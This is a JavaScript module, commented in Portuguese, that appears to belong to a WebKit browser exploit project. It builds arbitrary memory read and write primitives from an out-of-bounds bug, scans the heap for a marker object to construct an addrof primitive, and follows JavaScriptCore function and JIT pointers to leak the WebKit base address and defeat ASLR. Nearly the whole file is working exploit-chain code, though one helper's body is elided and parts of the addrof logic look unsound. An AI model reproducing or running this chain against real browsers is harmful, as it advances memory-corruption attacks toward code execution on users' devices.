// js/script3/testArrayBufferVictimCrash.mjs (CORREÇÃO FINAL DE TIPO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OOB_Exploit_Chain_v10_TypeFixed";

// --- Constantes e Offsets (sem alterações) ---
const OOB_DV_METADATA_BASE = 0x58;
const M_VECTOR_OFFSET_IN_DV = 0x10;
const M_LENGTH_OFFSET_IN_DV = 0x18;
const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x80;
const VICTIM_DV_POINTER_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_VECTOR_OFFSET_IN_DV;
const VICTIM_DV_LENGTH_ADDR_IN_OOB = VICTIM_DV_METADATA_ADDR_IN_OOB + M_LENGTH_OFFSET_IN_DV;
const JSCELL_STRUCTURE_POINTER_OFFSET = 0x8;
const JS_OBJECT_PROPERTIES_POINTER_OFFSET = 0x10;
const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18);
const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);
function isValidPointer(ptr) { /* ...código da função isValidPointer sem alterações... */ }


// =======================================================================================
// FUNÇÃO DE ATAQUE FINAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");

    let addrof_result = { success: false, msg: "Addrof: Não iniciado." };
    let webkit_leak_result = { success: false, msg: "WebKit Leak: Não executado." };
    let errorOccurred = null;
    let victim_dv_for_primitives = null;

    try {
        // --- FASE 1: Construção das Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- Fase 1: Construindo Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        victim_dv_for_primitives = new DataView(new ArrayBuffer(1024));

        // CORREÇÃO AQUI: Garante que o endereço seja sempre um AdvancedInt64
        const arb_write_64 = (address, value64) => {
            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
            victim_dv_for_primitives.setBigUint64(0, value64, true);
        };

        // CORREÇÃO AQUI: Garante que o endereço seja sempre um AdvancedInt64
        const arb_read_64 = (address) => {
            const addr64 = address instanceof AdvancedInt64 ? address : AdvancedInt64.fromBigInt(address);
            oob_write_absolute(VICTIM_DV_POINTER_ADDR_IN_OOB, addr64, 8);
            oob_write_absolute(VICTIM_DV_LENGTH_ADDR_IN_OOB, 8, 4);
            return victim_dv_for_primitives.getBigUint64(0, true);
        };
        logS3("    Primitivas 'arb_read_64' e 'arb_write_64' construídas com sucesso!", "vuln");
        
        // --- FASE 2: Vazamento de Endereço Inicial (Memory Scan) ---
        logS3("--- Fase 2: Vazamento de Endereço Inicial e Construção da 'addrof' ---", "subtest");
        
        let leaker_obj = {
            header: 0x0108230700000000n,
            butterfly: 0n,
            marker: 0x4142434445464748n
        };
        
        let leaker_obj_addr = null;
        const HEAP_SCAN_START = 0x1840000000n;
        const SCAN_RANGE = 0x200000; // Aumentado o range do scan
        logS3(`    Escaneando a memória a partir de 0x${HEAP_SCAN_START.toString(16)} em busca do marcador...`, "info");
        for (let i = 0; i < SCAN_RANGE; i++) {
            let current_addr = HEAP_SCAN_START + BigInt(i * 8);
            if (arb_read_64(current_addr) === leaker_obj.marker) {
                // O marcador está a 16 bytes do início em um objeto JS simples
                leaker_obj_addr = current_addr - 16n;
                logS3(`    Marcador encontrado! Endereço do objeto vazado: 0x${leaker_obj_addr.toString(16)}`, "leak");
                break;
            }
        }

        if (!leaker_obj_addr) {
            throw new Error("Não foi possível encontrar o objeto marcador na memória. Tente ajustar HEAP_SCAN_START ou aumentar SCAN_RANGE.");
        }

        // --- FASE 3: Construção da Primitiva 'addrof' real ---
        logS3("--- Fase 3: Construindo a Primitiva 'addrof' real ---", "subtest");
        
        // O butterfly (armazenamento de propriedades) está logo após o cabeçalho
        let butterfly_addr = leaker_obj_addr + 16n;
        arb_write_64(butterfly_addr, 0n); // Limpa o butterfly para nosso uso

        const addrof_primitive = (obj_to_leak) => {
            arb_write_64(butterfly_addr, obj_to_leak); // Coloca o objeto na propriedade do nosso leaker
            return arb_read_64(leaker_obj_addr + 8n); // Lê o butterfly que agora contém o endereço
        };
        
        addrof_result = { success: true, msg: "Primitiva 'addrof' construída com endereço real vazado." };
        logS3("    Primitiva 'addrof' REAL construída com sucesso!", "vuln");
        
        // --- FASE 4: Execução da Cadeia de Exploração ---
        logS3("--- Fase 4: Executando a Cadeia de Exploração REAL ---", "subtest");
        const target_func = () => {};
        const target_addr_bigint = addrof_primitive(target_func);
        const target_addr = AdvancedInt64.fromBigInt(target_addr_bigint);

        if (!isValidPointer(target_addr)) {
            throw new Error(`Endereço vazado pela 'addrof' (${target_addr.toString(true)}) não é um ponteiro válido.`);
        }
        logS3(`    Endereço REAL da função alvo: ${target_addr.toString(true)}`, "leak");

        const ptr_to_exec_bigint = arb_read_64(target_addr.add(JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE));
        const ptr_to_exec = AdvancedInt64.fromBigInt(ptr_to_exec_bigint);
        if (!isValidPointer(ptr_to_exec)) throw new Error("Ponteiro para ExecutableInstance inválido.");

        const ptr_to_jit_bigint = arb_read_64(ptr_to_exec.add(JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM));
        const ptr_to_jit = AdvancedInt64.fromBigInt(ptr_to_jit_bigint);
        if (!isValidPointer(ptr_to_jit)) throw new Error("Ponteiro para JIT/VM inválido.");
        
        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
        const webkit_base = ptr_to_jit.and(page_mask_4kb);

        webkit_leak_result = { success: true, msg: "Base do WebKit encontrada com sucesso!", webkit_base_candidate: webkit_base.toString(true) };
        logS3(`    SUCESSO FINAL! Base do WebKit encontrada: ${webkit_leak_result.webkit_base_candidate}`, "vuln");

    } catch (e) {
        errorOccurred = `ERRO na cadeia de exploração OOB: ${e.message}`;
        logS3(errorOccurred, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred, addrof_result, webkit_leak_result };
}
